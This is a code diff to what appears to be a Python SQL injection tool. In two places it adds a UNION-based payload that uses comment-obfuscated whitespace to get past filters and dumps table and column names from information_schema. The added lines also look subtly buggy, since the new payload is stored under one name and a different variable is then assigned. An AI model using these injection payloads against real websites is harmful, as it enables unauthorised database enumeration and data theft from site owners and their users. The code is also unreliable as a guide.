@@ -209,6 +209,8 @@ for payload in payload_name_bypass_1:
                             elif choose1 == "y":
                                 payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                 payloads_1 = f"{payloads}"
+                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
+                                payload_2 = f"{payloads}"
                                 print("[+] Payload test in progress...")
                                 time.sleep(2)
                                 print("[+] Testing 'UNION SELECT'")
@@ -379,6 +381,8 @@ for payload in payload_name_bypass_1:
                             elif choose1 == "y":
                                 payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                 payloads_1 = f"{payloads}"
+                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
+                                payload_2 = f"{payloads}"
                                 print("[+] Payload test in progress...")
                                 time.sleep(2)
                                 print("[+] Testing 'UNION SELECT'")
